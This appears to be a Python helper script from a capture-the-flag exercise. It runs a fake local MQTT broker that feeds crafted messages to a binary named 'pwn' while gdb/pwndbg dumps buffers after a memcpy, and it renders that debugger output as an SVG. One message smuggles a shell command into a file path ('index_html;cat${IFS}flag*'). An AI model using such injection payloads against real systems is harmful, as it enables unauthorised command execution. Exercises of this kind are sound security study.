#!/usr/bin/env python3
import html
import re
import socket
import struct
import subprocess
import threading
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parent
OUT_TXT = ROOT / "pwndbg_capture.txt"
OUT_SVG = ROOT / "pwndbg_capture.svg"


def recv_exact(conn, size):
    data = b""
    while len(data) < size:
        chunk = conn.recv(size - len(data))
        if not chunk:
            raise EOFError("connection closed")
        data += chunk
    return data


def recv_packet(conn):
    header = recv_exact(conn, 1)[0]
    remain = 0
    mul = 1
    while True:
        cur = recv_exact(conn, 1)[0]
        remain += (cur & 0x7F) * mul
        if not (cur & 0x80):
            break
        mul *= 128
    return header, recv_exact(conn, remain)


def enc_len(value):
    data = bytearray()
    while True:
        cur = value % 128
        value //= 128
        if value:
            cur |= 0x80
        data.append(cur)
        if not value:
            return bytes(data)


def mqtt_str(data):
    return struct.pack("!H", len(data)) + data


def publish(topic, payload):
    body = mqtt_str(topic) + payload
    return b"\x30" + enc_len(len(body)) + body


def broker_main(ready):
    host = "127.0.0.1"
    port = 9999
    topic = b"HTTP"
    stage1 = (
        b"GET /home/ctf/index_html;"
        + b"cat$"
        + b"{IFS}flag*"
        + b" HTTP/1.1\r\nHost: x\r\n"
    )
    stage2 = b"GET /home/ctf/index_html HTTP/1.1\r\nHost: x\r\nContentLength: 10\r\n"

    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(1)
    ready.set()
    conn = None
    try:
        conn, _ = srv.accept()
        recv_packet(conn)
        conn.sendall(b"\x20\x02\x00\x00")
        _, body = recv_packet(conn)
        pid = body[:2]
        conn.sendall(b"\x90\x03" + pid + b"\x00")
        time.sleep(3.0)
        conn.sendall(publish(topic, stage1))
        time.sleep(0.8)
        conn.sendall(publish(topic, stage2))
        time.sleep(2.0)
    finally:
        if conn is not None:
            try:
                conn.close()
            except OSError:
                pass
        srv.close()


def strip_ansi(text):
    return re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", text)


def render_terminal(text, path):
    lines = text.splitlines()
    if not lines:
        lines = ["<empty>"]

    font_size = 20
    char_width = 12
    line_height = 28
    left = 32
    top = 56
    width = max(1600, len(max(lines, key=len)) * char_width + left * 2)
    height = top + len(lines) * line_height + 40

    svg = [
        f'<svg xmlns="http://www.w3.org/2000/svg" width="{width}" height="{height}" viewBox="0 0 {width} {height}">',
        '<rect width="100%" height="100%" fill="#0f121a"/>',
        f'<rect x="18" y="18" width="{width - 36}" height="{height - 36}" rx="18" ry="18" fill="#181c28"/>',
        '<text x="36" y="38" fill="#89b4fa" font-family="DejaVu Sans Mono, monospace" font-size="20">pwndbg attach mini-mqtt</text>',
    ]

    y = top
    for line in lines:
        color = "#e6e9ef"
        if "Breakpoint" in line or "hit post-memcpy" in line:
            color = "#a6e3a1"
        elif "global_cmd" in line or "local_cmd" in line or "filename" in line:
            color = "#f9e2af"
        elif "context" in line or "LEGEND" in line:
            color = "#b4befe"
        elif "SIG" in line or "Error" in line or "failed" in line.lower():
            color = "#f38ba8"
        svg.append(
            f'<text x="{left}" y="{y}" fill="{color}" font-family="DejaVu Sans Mono, monospace" font-size="{font_size}">{html.escape(line)}</text>'
        )
        y += line_height

    svg.append("</svg>")
    path.write_text("\n".join(svg))


def main():
    ready = threading.Event()
    broker = threading.Thread(target=broker_main, args=(ready,), daemon=True)
    broker.start()
    if not ready.wait(timeout=3):
        raise SystemExit("broker failed to start")

    gdb_script = ROOT / "mini_attach.gdb"
    gdb_script.write_text(
        "\n".join(
            [
                "set pagination off",
                "set confirm off",
                "starti",
                "set stop-on-solib-events 1",
                "continue",
                "set stop-on-solib-events 0",
                "breakrva 0x1a45 pwn",
                "ignore 1 1",
                "continue",
                'printf "\\n[+] hit post-memcpy breakpoint\\n"',
                'printf "[filename]\\n"',
                "x/s $rbp-0x220",
                'printf "[local_cmd]\\n"',
                "x/s $rbp-0x1a0",
                'printf "[global_cmd]\\n"',
                "x/s $rip+0x36fb",
                'printf "[content_len]\\n"',
                "p/d *(int *)($rbp-0x280)",
                'printf "\\n[pwndbg context]\\n"',
                "context",
                "quit",
                "",
            ]
        )
    )

    proc = subprocess.run(
        [
            "gdb",
            "-q",
            "-x",
            str(gdb_script),
            "--args",
            "./ld-linux-x86-64.so.2",
            "--library-path",
            ".",
            "./pwn",
        ],
        cwd=ROOT,
        capture_output=True,
        text=True,
        timeout=20,
        errors="ignore",
    )
    text = proc.stdout + proc.stderr

    broker.join(timeout=1)
    text = strip_ansi(text)
    OUT_TXT.write_text(text)

    if "[+] hit post-memcpy breakpoint" not in text:
        raise SystemExit("failed to hit breakpoint\n" + text)

    key_idx = text.find("[+] hit post-memcpy breakpoint")
    snippet = text[max(0, key_idx - 1800) : key_idx + 4200]
    render_terminal(snippet, OUT_SVG)
    print(OUT_SVG)


if __name__ == "__main__":
    main()
